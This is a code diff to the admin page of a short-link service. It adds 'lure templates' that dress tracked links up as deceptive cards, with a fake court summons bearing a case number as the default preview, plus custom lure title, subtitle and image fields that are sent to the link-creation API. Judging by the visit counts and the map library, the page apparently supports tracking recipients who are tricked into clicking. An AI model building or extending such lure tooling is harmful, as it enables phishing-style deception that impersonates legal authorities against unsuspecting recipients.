@@ -61,7 +61,7 @@
                             <thead>
                                 <tr>
                                     <th>短链接</th>
-                                    <th>原始URL</th>
+                                    <th>诱导标题</th>
                                     <th>访问量</th>
                                     <th>创建时间</th>
                                     <th>状态</th>
@@ -132,7 +132,7 @@
 
     <!-- 创建短链接模态框 -->
     <div class="modal" id="createModal">
-        <div class="modal-content">
+        <div class="modal-content" style="max-width: 600px;">
             <div class="modal-header">
                 <h3>创建短链接</h3>
                 <button class="close-btn" id="closeModal">&times;</button>
@@ -142,6 +142,35 @@
                     <label for="originalUrl">目标文章URL</label>
                     <input type="url" id="originalUrl" placeholder="https://example.com/article/123">
                 </div>
+                
+                <div class="form-group">
+                    <label>选择诱导模板</label>
+                    <div class="template-grid" id="templateGrid"></div>
+                </div>
+
+                <div class="form-group" id="customTitleGroup" style="display:none;">
+                    <label for="customTitle">自定义标题</label>
+                    <input type="text" id="customTitle" placeholder="输入自定义标题">
+                </div>
+
+                <div class="form-group" id="customSubtitleGroup" style="display:none;">
+                    <label for="customSubtitle">自定义副标题</label>
+                    <input type="text" id="customSubtitle" placeholder="输入自定义副标题">
+                </div>
+
+                <div class="form-group" id="customImageGroup" style="display:none;">
+                    <label for="customImage">自定义图片URL（可选）</label>
+                    <input type="text" id="customImage" placeholder="https://example.com/image.jpg">
+                </div>
+
+                <div class="preview-box" id="previewBox">
+                    <label>预览效果</label>
+                    <div class="preview-card" id="previewCard">
+                        <div class="preview-icon" id="previewIcon">⚖️</div>
+                        <div class="preview-title" id="previewTitle">法院传票</div>
+                        <div class="preview-subtitle" id="previewSubtitle">（2026粤0305民初xxx号）</div>
+                    </div>
+                </div>
             </div>
             <div class="modal-footer">
                 <button class="btn btn-secondary" id="cancelBtn">取消</button>
@@ -150,7 +179,190 @@
         </div>
     </div>
 
+    <style>
+        .template-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-top: 8px;
+        }
+        .template-item {
+            padding: 12px 8px;
+            border: 2px solid #eee;
+            border-radius: 8px;
+            cursor: pointer;
+            text-align: center;
+            transition: all 0.2s;
+        }
+        .template-item:hover {
+            border-color: #667eea;
+        }
+        .template-item.active {
+            border-color: #667eea;
+            background: rgba(102, 126, 234, 0.1);
+        }
+        .template-item .t-icon {
+            font-size: 24px;
+            margin-bottom: 4px;
+        }
+        .template-item .t-name {
+            font-size: 12px;
+            color: #666;
+        }
+        .preview-box {
+            margin-top: 16px;
+            padding: 16px;
+            background: #f8f9fa;
+            border-radius: 8px;
+        }
+        .preview-box label {
+            display: block;
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 8px;
+        }
+        .preview-card {
+            background: linear-gradient(135deg, #e53e3e, #c53030);
+            color: white;
+            padding: 20px;
+            border-radius: 12px;
+            text-align: center;
+        }
+        .preview-icon {
+            font-size: 36px;
+            margin-bottom: 8px;
+        }
+        .preview-title {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+        .preview-subtitle {
+            font-size: 12px;
+            opacity: 0.9;
+        }
+    </style>
+
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script src="/static/js/admin.js"></script>
+    <script>
+        var templates = [];
+        var selectedTemplate = 'court';
+        var customTitle = '';
+        var customSubtitle = '';
+        var customImage = '';
+
+        async function loadTemplates() {
+            try {
+                const response = await fetch('/api/shortlinks/templates');
+                const result = await response.json();
+                if (result.code === 0) {
+                    templates = result.data;
+                    renderTemplates();
+                }
+            } catch (error) {
+                console.error('Failed to load templates:', error);
+            }
+        }
+
+        function renderTemplates() {
+            const grid = document.getElementById('templateGrid');
+            grid.innerHTML = templates.map(t => `
+                <div class="template-item ${t.id === selectedTemplate ? 'active' : ''}" data-id="${t.id}">
+                    <div class="t-icon">${t.icon}</div>
+                    <div class="t-name">${t.name}</div>
+                </div>
+            `).join('');
+
+            document.querySelectorAll('.template-item').forEach(item => {
+                item.addEventListener('click', function() {
+                    selectedTemplate = this.dataset.id;
+                    document.querySelectorAll('.template-item').forEach(i => i.classList.remove('active'));
+                    this.classList.add('active');
+                    updatePreview();
+                    toggleCustomFields();
+                });
+            });
+        }
+
+        function toggleCustomFields() {
+            const customGroup = document.getElementById('customTitleGroup');
+            const subtitleGroup = document.getElementById('customSubtitleGroup');
+            const imageGroup = document.getElementById('customImageGroup');
+            
+            if (selectedTemplate === 'custom') {
+                customGroup.style.display = 'block';
+                subtitleGroup.style.display = 'block';
+                imageGroup.style.display = 'block';
+            } else {
+                customGroup.style.display = 'none';
+                subtitleGroup.style.display = 'none';
+                imageGroup.style.display = 'none';
+            }
+        }
+
+        function updatePreview() {
+            let template = templates.find(t => t.id === selectedTemplate);
+            if (!template) template = templates[0];
+            
+            document.getElementById('previewIcon').textContent = template.icon;
+            document.getElementById('previewTitle').textContent = customTitle || template.title || '标题';
+            document.getElementById('previewSubtitle').textContent = customSubtitle || template.subtitle || '副标题';
+        }
+
+        document.getElementById('customTitle').addEventListener('input', function() {
+            customTitle = this.value;
+            updatePreview();
+        });
+
+        document.getElementById('customSubtitle').addEventListener('input', function() {
+            customSubtitle = this.value;
+            updatePreview();
+        });
+
+        document.getElementById('customImage').addEventListener('input', function() {
+            customImage = this.value;
+        });
+
+        loadTemplates();
+
+        const originalCreateShortlink = window.createShortlink;
+        window.createShortlink = function() {
+            const url = document.getElementById('originalUrl').value;
+            if (!url) {
+                alert('请输入URL地址');
+                return;
+            }
+
+            const body = {
+                url: url,
+                诱导模板: selectedTemplate,
+                诱导标题: customTitle,
+                诱导副标题: customSubtitle,
+                诱导图片URL: customImage
+            };
+
+            fetch('/api/shortlinks/create', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(body)
+            })
+            .then(res => res.json())
+            .then(result => {
+                if (result.code === 0) {
+                    alert('创建成功！短链接: /' + result.data.code);
+                    document.getElementById('createModal').classList.remove('active');
+                    document.getElementById('originalUrl').value = '';
+                    loadShortlinks();
+                    loadStats();
+                } else {
+                    alert('错误: ' + result.message);
+                }
+            })
+            .catch(error => {
+                alert('创建失败');
+            });
+        };
+    </script>
 </body>
 </html>
